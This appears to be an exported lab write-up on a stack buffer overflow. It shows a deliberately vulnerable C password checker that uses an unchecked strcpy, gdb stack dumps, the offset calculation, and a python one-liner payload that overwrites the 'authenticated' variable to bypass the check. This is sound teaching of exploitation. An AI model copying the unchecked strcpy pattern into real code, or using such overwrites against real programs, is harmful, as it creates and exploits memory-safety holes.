@@ -1,0 +1,753 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Simple over-write </title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="7dcdb8b2-f8e4-4782-96c7-ce3e6d100e47" class="page sans"><header><h1 class="page-title">Simple over-write </h1></header><div class="page-body"><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="13da2bb9-9bd6-4233-8900-df25c7590699"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Buffer over-writing a single variable</div></figure><p id="b6848d9f-94c6-4628-8e5b-da84a17e17e7" class="">
+</p><p id="67bae688-79f3-4e97-b98e-1e9e2f72838e" class="">Available: ELF binary, C file </p><pre id="4a8e5687-be0a-4f09-bdd9-fd8144db2169" class="code"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;openssl/sha.h&gt;
+
+#define MAGIC_VALUE 1337
+
+//argc is the number of received arguments
+int main(int argc, char *argv[]) {
+		
+	unsigned char correct_hash[20] = {
+		0x4a, 0xc9, 0xb0, 0x57, 0xf8, 0x02, 0x12, 0x60, 0x6c, 0xea,
+		0xab, 0xf3, 0xc6, 0x50, 0x5d, 0xaf, 0xed, 0x40, 0xa4, 0x50
+	};
+	char password[20];
+	int authenticated = 0;
+
+	//password = argv[1];
+	strcpy(password, argv[1]);
+
+	//password = SHA1(password);
+	SHA1(password, strlen((char *)password), password);
+
+	//password == correct_hash
+	if(memcmp(password, correct_hash, 20) == 0) {
+		authenticated = MAGIC_VALUE;
+	}
+
+	printf(&quot;Authenticated: %d\n&quot;, authenticated);
+	if(authenticated == MAGIC_VALUE) {
+		printf(&quot;CORRECT PASSWORD!\n&quot;);
+	} else {
+		printf(&quot;WRONG PASSWORD!\n&quot;);
+	}
+	fflush(stdout);
+	return 0;
+}</code></pre><p id="5682380a-2fcd-4505-b101-6120fe029318" class="">The program takes a command line argument <mark class="highlight-gray"><code>*argv[1]</code></mark>, copies it into <mark class="highlight-gray"><code>password</code></mark>, hashes it with SHA1 and compares it with <mark class="highlight-gray"><code>correct_hash</code></mark>. to then set the a</p><p id="1030afb7-754e-4f36-8f58-0c840ae54e34" class="">If they are equal, <mark class="highlight-gray"><code>authenticated</code></mark><mark class="highlight-gray"> </mark>is set to <mark class="highlight-gray"><code>1337</code></mark><mark class="highlight-gray"> </mark>(serves as a flag) and the application prints a success message.</p><p id="35da5328-a1b5-435c-82d5-455775a1ecd5" class="">Goal: We want to set <mark class="highlight-gray"><code>authenticated</code></mark><mark class="highlight-gray"> </mark>to <mark class="highlight-gray"><code>1337</code></mark>.</p><p id="de03ee56-8d4c-46b4-a01b-be445a73990a" class="">
+</p><h2 id="7a24163a-2848-4d59-a89d-2b00700e36ed" class="">Finding Vulnerability</h2><p id="843515d9-f9aa-4759-937f-ab60631e8516" class="">We find a buffer overflow vulnerability with an input of exactly 44x <mark class="highlight-gray"><code>&#x27;A&#x27;</code></mark>. </p><pre id="e3506448-3ef6-436d-9dd2-e57e4c4d9648" class="code"><code>marco@testbed:~/2020/gdb$ ./pwnme AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Authenticated: 1094795585
+WRONG PASSWORD!
+Segmentation fault (core dumped)</code></pre><p id="5ddf73bb-2fd8-4385-bb26-476267626f2c" class="">
+</p><h2 id="2168ec68-5011-45df-94e9-c48ccb4ad8c3" class="">Exploting Vulnerability</h2><p id="f54fe8b4-c882-413e-a9da-9be9e24f417a" class="">We disassemble the code and go through the assembly code.</p><p id="b464f15c-b05e-48f8-bd3a-75010056ed9a" class="">We see that at instruction <code>0x0804869e</code> the program compares <code>authenticated</code> (stored at the address <code>$ebp-0xc</code>) with the value <code>0x539</code> (= <mark class="highlight-gray"><code>1337</code></mark><mark class="highlight-gray"> </mark>base 10).<div class="indented"><pre id="d48464d1-e22a-4151-82e4-09b7667b3850" class="code"><code>0x804869e &lt;main+232&gt;:        cmp    DWORD PTR [ebp-0xc],0x539</code></pre><p id="ac8a0651-53fa-478e-b494-3395ae54d1f2" class="">This is where the following instruction is executed:</p><pre id="01167213-be4a-4ccb-9a8f-c8dc369de79c" class="code"><code>if(memcmp(password, correct_hash, 20) == 0) { ... }</code></pre><p id="867f779b-d30e-4298-82c2-d02dd2ee5d06" class="">
+</p></div></p><p id="9e4be269-e678-40cc-9a0b-b663cac64676" class="">We also found calls to library functions that are marked, like <mark class="highlight-gray"><code>&lt;strcpy@plt&gt;</code></mark><mark class="highlight-gray"> </mark>at <mark class="highlight-gray"><code>0x8048644</code></mark>.</p><p id="3568e3c7-7bd4-42cf-932d-138fa6fd8023" class="">We set a breakpoint there (to see the <mark class="highlight-gray"><code>password</code></mark><mark class="highlight-gray"> </mark>array before it is hashed) and enter 20x<mark class="highlight-gray"> </mark><mark class="highlight-gray"><code>&#x27;A&#x27;</code></mark> = <mark class="highlight-gray"><code>0x41</code></mark> and look at the stack to see what space it occupies:<div class="indented"><p id="ec866a97-e88c-4fd9-9d65-250b48673af7" class="">Password array starts at <code>0xffffd614</code>.</p><pre id="d589ceb1-ff6b-46eb-ad2b-57197960a295" class="code"><code>(gdb) x/40wx $esp
+0xffffd610:     0xf7dd0000      0x41414141      0x41414141      0x41414141
+0xffffd620:     0x41414141      0x41414141      0x57b0c94a      0x601202f8
+0xffffd630:     0xf3abea6c      0xaf5d50c6      0x50a440ed      0x00000000
+0xffffd640:     0xffffd660      0x00000000      0x00000000      0xf7c10e81
+0xffffd650:     0xf7dd0000      0xf7dd0000      0x00000000      0xf7c10e81
+0xffffd660:     0x00000002      0xffffd6f4      0xffffd700      0xffffd684
+0xffffd670:     0x00000001      0x00000000      0xf7dd0000      0xf7fe575a
+0xffffd680:     0xf7ffd000      0x00000000      0xf7dd0000      0x00000000
+0xffffd690:     0x00000000      0x918ba4ec      0xec3be2fc      0x00000000
+0xffffd6a0:     0x00000000      0x00000000      0x00000002      0x080484a0</code></pre><p id="983cf10f-9d76-4512-9aea-5990873bb0cd" class="">The stack looks like this:</p><pre id="62414551-bc49-4c4d-91cf-7f87a2e359a3" class="code"><code>unsigned char correct_hash[20] = { ... }; //20 bytes
+char password[20]; //20 bytes (1 per char)
+int authenticated = 0; //4 bytes </code></pre><pre id="6fd6c83e-f279-4234-9f6d-d6d1fee9d84a" class="code"><code>0x000...
+|      ...      |
+|---------------| &lt;= esp       
+| password      | &lt;= ebp - 52 (= esp)
+| correct_hash  | &lt;= ebp - 20
+| authenticated | &lt;= ebp - 12
+|      ...      |
+|---------------| &lt;= ebp
+| sfp (old ebp) | 
+| ret adr       |
+|---------------|
+| argv[]        |
+|      ...      |
+0xFFF...</code></pre></div></p><p id="da8a9201-4384-4dc1-8ccf-90864189b61d" class="">
+</p><p id="b8942b68-6d71-4d15-a814-d5fb57367cd9" class="">We calculate the size of our payload:<div class="indented"><p id="769bcbcb-cfd2-4701-b2d8-118130003537" class=""><code>authenticated</code> is at <code>$ebp-0xc</code> (= <code>ebp - 12</code>) and</p><p id="597c9c08-6fb0-4fe2-96c5-7b49b2b9b1a4" class=""><code>password</code> starts at <code>0xffffd614</code>.</p><p id="a161264e-1df4-4d14-90c5-147aa2f43521" class="">We know <mark class="highlight-gray"><code>authenticated</code></mark><mark class="highlight-gray"> </mark>can be overwritten from <mark class="highlight-gray"><code>password</code></mark><mark class="highlight-gray"> </mark>with a padding of the size:</p><pre id="6e2a0f54-6f04-4f73-9a21-2546ee650adc" class="code code-wrap"><code>(gdb) ($ebp-0xc)-(0xffffd614)
+40 </code></pre></div></p><p id="19b04008-ff02-413c-a42b-c05e94c18b82" class="">
+</p><p id="d57b465e-29c0-444d-ac4b-acb8565709e7" class="">Due to little endianness we have to store <code>0x539</code> (= <code>1337</code>) as <code>0x39 0x05</code>. <div class="indented"><pre id="3098e7f6-cf84-44c8-8ba9-f7172e657b91" class="code code-wrap"><code>marco@testbed:~/2020/gdb$ ./pwnme $(python3 -c &#x27;print(&quot;A&quot;*40 + &quot;\x39\x05&quot;)&#x27;)
+Authenticated: 1337
+CORRECT PASSWORD!</code></pre><p id="fbff6426-95a9-45eb-9c4d-ca1e3be4ee13" class="">
+</p></div></p><p id="476c75a6-4296-42db-9054-e35339eaaa1b" class="">Then our memory looks like this:</p><pre id="8e145e4e-7cb3-4da2-8702-5b6da24c7ab2" class="code"><code>(gdb) x/40wx $esp
+0xffffd610:     0xf7dd0000      0x41414141      0x41414141      0x41414141
+0xffffd620:     0x41414141      0x41414141      0x41414141      0x41414141      
+0xffffd630:     0x41414141      0x41414141      0x41414141      0x00003905
+0xffffd640:     0xffffd660      0x00000000      0x00000000      0xf7c10e81
+0xffffd650:     0xf7dd0000      0xf7dd0000      0x00000000      0xf7c10e81
+0xffffd660:     0x00000002      0xffffd6f4      0xffffd700      0xffffd684
+0xffffd670:     0x00000001      0x00000000      0xf7dd0000      0xf7fe575a
+0xffffd680:     0xf7ffd000      0x00000000      0xf7dd0000      0x00000000
+0xffffd690:     0x00000000      0x918ba4ec      0xec3be2fc      0x00000000
+0xffffd6a0:     0x00000000      0x00000000      0x00000002      0x080484a0</code></pre></div></article></body></html>
